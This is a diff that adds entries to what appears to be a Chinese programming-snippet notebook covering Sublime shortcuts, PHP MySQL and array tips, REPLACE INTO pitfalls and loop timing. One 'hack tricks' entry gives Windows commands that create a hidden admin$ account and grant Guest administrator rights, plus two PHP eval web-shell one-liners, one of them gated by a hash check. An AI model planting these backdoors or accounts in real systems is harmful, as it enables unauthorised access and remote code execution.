@@ -157,3 +157,96 @@ function xmlToString(xmlData) {
     return xmlString;
 }
 ```
+###[Sublime Text 奇技淫巧](https://wowphp.com/post/qzpnewo2gxj8.html)
+```js
+用标签包裹行或选中项 Win：ALT + SHIFT + W     Mac：CTRL + ⇧ + W
+计算数学表达式 Win：CTRL + SHIFT + Y     Mac：⌘ + ⇧ + Y
+上移或下移行 Win：CTRL + SHIFT + ↑ 或 ↓     Mac：⌘ + CTRL + ⇧ 或 ⇩
+```
+###[Windows下搭建开发环境](https://wowphp.com/post/x69ndryep302.html)
+```js
+// 连接你的本地MySQL数据库 记得把 _CLh*#0Vlnwt 改为你自己的密码
+$mysqli = new mysqli('127.0.0.1', 'root', '_CLh*#0Vlnwt');
+// 连接失败
+if ($mysqli->connect_error) {
+    die('Connect Error (' . $mysqli->connect_errno . ') '
+            . $mysqli->connect_error);
+}
+// 连接成功https://wowphp.com/catalog.html
+echo 'Connection OK';
+// 关闭MySQL连接
+$mysqli->close();
+```
+###[PHP 数组去重](https://wowphp.com/post/o1xkd7l6dvj3.html)
+```js
+$array = array('green','blue','orange','blue');
+$array = array_flip($array);
+$array = array_flip($array);
+ 
+/* 使用array_merge()函数修复键值*/
+$array = array_merge($array);
+$array = array('green','blue','orange','blue');
+$array = array_flip($array);
+/* 跟第一个例子一样，但是现在我们先提取数组的键值 */
+$array = array_keys($array);
+```
+###["replace into" 的坑](https://wowphp.com/post/k08pekpxd9q7.html)
+```js
+在执行 REPLACE INTO auto (k) VALUES (1) 时首先尝试 INSERT INTO auto (k) VALUES (1)，但由于已经存在一条 k=1 的记录，发生了 duplicate key error，于是 MySQL 会先删除已有的那条 k=1 即 id=1 的记录，然后重新写入一条新的记录。
+满足这一需求的 MySQL 方言是:
+
+INSERT INTO auto (k, v) VALUES (1, ‘1-1’) ON DUPLICATE KEY UPDATE v=VALUES(v);
+
+鉴于此，很多使用 REPLACE INTO 的场景，实际上需要的是 INSERT INTO … ON DUPLICATE KEY UPDATE，在正确理解 REPLACE INTO 行为和副作用的前提下，谨慎使用 REPLACE INTO
+```
+###[Hack神器及奇技淫巧](http://blog.yfgeek.com/2016/09/11/hacktool/)
+```js
+http://www.findmima.com/
+
+http://www.wghostk.com/so/
+
+http://p.08lt.com
+http://whois.domaintools.com/
+http://www.144118.com/
+Windows新建用户
+
+net user admin$ admin /add
+
+net localgroup administrators admin$ /add
+
+net user Guest 1234
+
+net user Guest /active:yes
+
+net localgroup administrators Guest /add
+<?php eval($_POST[g]);?>
+<?php substr(md5($_REQUEST['heroes']),28)=='acd0'&&eval($_REQUEST['c']);?>
+
+```
+###[php农历 ](http://blog.leanote.com/post/sinux/8ca27e3f616c)
+```js
+
+
+```
+###[循环加速](http://www.phppan.com/2011/01/craft-1-cycle/)
+```js
+$data = range(0, 1000000);
+ 
+$start = xdebug_time_index();
+ 
+$len = count($data);	//	其实局部变量是很快的。
+for($i = 0; $i < $len; $i++) {
+}
+$end = xdebug_time_index();
+ 
+echo $end - $start;
+$data = range(0, 1000000);
+ 将计数变量从大到小递减，当为0时自动停止。从而将判断语句和计数加1两条语句变成了一条语句。
+$start = xdebug_time_index();
+ 
+for($i = count($data); $i--;) {	//	我是关注点所在行
+}
+$end = xdebug_time_index();
+ 
+echo $end - $start;
+```
